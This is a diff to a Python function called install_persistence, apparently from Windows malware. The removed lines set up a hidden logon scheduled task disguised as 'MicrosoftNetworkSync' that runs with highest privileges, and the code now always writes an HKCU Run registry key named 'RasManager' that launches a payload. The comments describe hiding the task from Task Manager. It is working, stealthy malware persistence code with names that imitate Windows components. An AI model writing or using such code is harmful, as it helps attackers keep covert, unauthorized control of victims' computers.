@@ -5095,31 +5095,13 @@ def install_persistence():
         except Exception:
             pass
 
-        # Scheduled task â€” invisible, NOT shown in Task Manager startup tab
+        # Use HKCU Run registry for persistence
         if os.path.isfile(dst_py) and os.path.isfile(payload_path):
-            # Create scheduled task at logon â€” hidden, runs ms.py directly with svchost.exe
-            task_cmd = (
-                f'schtasks /create /tn "MicrosoftNetworkSync" '
-                f'/tr "\\"{dst_py}\\" \\"{payload_path}\\" --boot" '
-                f'/sc onlogon /f /rl highest'
-            )
-            res = subprocess.run(task_cmd, shell=True,
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                           creationflags=0x08000000)
-
             try:
                 rk = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                     r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                     0, winreg.KEY_SET_VALUE)
-                if res.returncode == 0:
-                    # Admin: Schtasks succeeded, remove any old registry fallback
-                    try:
-                        winreg.DeleteValue(rk, "RasManager")
-                    except Exception:
-                        pass
-                else:
-                    # Non-admin: Schtasks failed, use HKCU registry fallback
-                    winreg.SetValueEx(rk, "RasManager", 0, winreg.REG_SZ, f'"{dst_py}" "{payload_path}" --boot')
+                winreg.SetValueEx(rk, "RasManager", 0, winreg.REG_SZ, f'"{dst_py}" "{payload_path}" --boot')
                 winreg.CloseKey(rk)
             except Exception:
                 pass
